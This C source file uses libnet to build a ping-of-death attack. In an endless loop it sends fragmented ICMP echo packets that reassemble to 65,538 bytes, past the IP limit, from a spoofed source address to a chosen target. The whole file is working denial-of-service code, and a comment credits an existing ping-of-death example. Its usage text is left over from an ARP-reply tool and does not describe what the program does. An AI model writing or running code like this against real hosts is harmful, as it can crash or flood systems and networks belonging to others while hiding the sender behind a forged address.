#include <stdio.h>
#include <libnet.h>

#define FLOOD_DELAY 5000
#define FRAG_LEN    1472

void usage (char *name){
  printf ("%s - Send arbitrary ARP replies\n", name);
  printf ("Usage: %s [-i interface] -s ip_address -t dest_ip\n", name);
  printf ("    -i    interface to send on\n");
  printf ("    -s    IP address we are claiming to be\n");
  printf ("    -t    IP address of recipient\n");
  printf ("    -m    Ethernet MAC address of recipient\n");
  exit (1);
}
int main(int argc, char *argv[]){
    char *device  = "en0";
    u_int32_t ipaddr;
    u_int32_t destaddr;
    libnet_t *l;
    libnet_ptag_t ip = 0, icmp = 0;
    struct libnet_ipv4_hdr *ip_hdr;
    struct libnet_icmpv4_hdr *icmp_hdr;
    u_int8_t *packet;
    u_int16_t id, seq, count;
    int c, i , flags, offset, len;
    char errbuf[LIBNET_ERRBUF_SIZE];
    if(argc < 2)
    usage(argv[0]);

    u_char *data;
    
    data = malloc(FRAG_LEN);
    for (i = 0 ; i < FRAG_LEN ; i++)
    {
        /* fill it with something */
        data[i] = 0x3a;
    }

    
    // char * addr = libnet_addr2name4(ipaddr, LIBNET_RESOLVE);
    // printf("%s\n", addr);
    l = libnet_init (LIBNET_RAW4, device, errbuf);
    
    if(l== NULL){
        fprintf(stderr, "Error opening context: %s", errbuf);
        exit(1);
    }

    ipaddr = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE);
    destaddr = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE);
    if(ipaddr == -1 || destaddr == -1){
        fprintf(stderr, "Bad IP address %s \n", libnet_geterror(l));
        exit(1);
    }
    //id = getpid();
    ip = LIBNET_PTAG_INITIALIZER;
    icmp = LIBNET_PTAG_INITIALIZER;
    libnet_seed_prand(l);
    

    //huge thanks to https://fossies.org/dox/libnet-libnet-1.2/ping__of__death_8c_source.html
    
    while(1){
        id = libnet_get_prand(LIBNET_PRu16);
        seq = libnet_get_prand(LIBNET_PRu32);
        for (i = 0 ; i < 65536 ; i += (LIBNET_ICMPV4_ECHO_H + FRAG_LEN))
     {
         offset = i;
         flags = 0;
  
         if (offset < 65120)
         {
            flags = IP_MF;
            len = FRAG_LEN;
         }
         else
         {
             /* for a total reconstructed length of 65538 bytes */
            len = 410;
         }
         icmp = libnet_build_icmpv4_echo(
            ICMP_ECHO,
            0,
            0,
            id, 
            seq,
            data,
            len,
            l,
            icmp);
        if(icmp == -1){
            fprintf(stderr, "Can't build ICMP header: %s\n", libnet_geterror(l));
            exit(1);
        }
        ip = libnet_build_ipv4(
            LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H + len,
            0,
            id,
            flags | (offset >> 3),
            64,
            IPPROTO_ICMP,
            0, 
            ipaddr,
            destaddr,
            NULL,
            0,
            l,
            ip);
        
        
        if(ip == -1){
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            exit(1);
        }
        c = libnet_write(l);
        if(c== -1){
            fprintf(stderr, "Write Error: %s\n", libnet_geterror(l));
            exit(1);
        }
        // icmp = libnet_build_icmpv4_echo(
        //     ICMP_ECHO,
        //     0,
        //     0,
        //     id, 
        //     seq,
        //     NULL,
        //     0,
        //     l,
        //     icmp);
        // if(icmp == -1){
        //     fprintf(stderr, "Can't build ICMP header: %s\n", libnet_geterror(l));
        //     exit(1);
        // }
        // ip = libnet_build_ipv4(
        //     LIBNET_IPV4_H + LIBNET_ICMPV4_ECHO_H,
        //     0,
        //     id,
        //     0,
        //     64,
        //     IPPROTO_ICMP,
        //     0, 
        //     ipaddr,
        //     destaddr,
        //     NULL,
        //     0,
        //     l,
        //     ip);
        
        
        // if(ip == -1){
        //     fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
        //     exit(1);
        // }
        // c = libnet_write(l);
        // if(c== -1){
        //     fprintf(stderr, "Write Error: %s\n", libnet_geterror(l));
        //     exit(1);
        // }
     }
        
        usleep(FLOOD_DELAY);
    }
    
    
    libnet_destroy(l);
    return 0;

}
